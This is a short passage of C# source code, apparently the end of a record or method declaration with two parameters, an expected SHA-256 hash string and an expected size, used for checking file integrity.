        string ExpectedSha256,
        long ExpectedSize);
}
